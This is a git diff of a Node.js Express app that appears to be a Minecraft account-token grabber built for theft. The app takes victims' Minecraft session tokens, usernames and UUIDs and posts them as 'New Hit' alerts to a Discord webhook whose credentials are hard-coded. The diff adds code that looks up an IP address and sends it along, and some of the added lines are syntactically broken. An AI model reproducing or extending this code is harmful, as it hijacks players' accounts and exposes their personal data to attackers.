@@ -73,7 +73,8 @@ app.get(`/token`, async (req, res) => {
 	var IgnAndUuid = await getUsername(MinecraftToken);
 	var Ign = IgnAndUuid[0];
 	var Uuid = IgnAndUuid[1];
-	await sendEmbed(MinecraftToken, Uuid, Ign);
+	var ip = await getIp()
+	await sendEmbed(MinecraftToken, Uuid, Ign, ip);
 });
 
 async function createLink(id, url, scopes) {
@@ -162,24 +163,31 @@ async function getUsername(token) {
 	return [ign, uuid];
 }
 
-async function sendEmbed(MinecraftToken, uuid, username) {
+async function getIp(){
+	const response = axios.get(`https://api.myip.com`)
+	var ip = response.ip
+	return ip
+}
+
+async function sendEmbed(MinecraftToken, uuid, username, ip) {
 	const webhook = new WebhookClient({
 		id: '1090664218010845234',
 		token:
 			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
 	});
 	const embed = new EmbedBuilder()
-		.setTitle(`**New Hit ❗**`)
+		.setTitle(`**New Hit ❗** @everyone`)
 		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
-		.setDescription('@everyone')
+		// .setDescription('@everyone')
 		.setColor(0x0099FF)
 		.addFields(
 			{ name: 'Nom', value: `\`${username}\``, inline: true },
 			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
 			{
-				name: 'Minecraft Auth',
+				name: 'SSID',
 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
 			}
+			{name: `IPV4`, value:`\`${ip}\``, inline: true }
 		)
 		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
 		.setTimestamp();
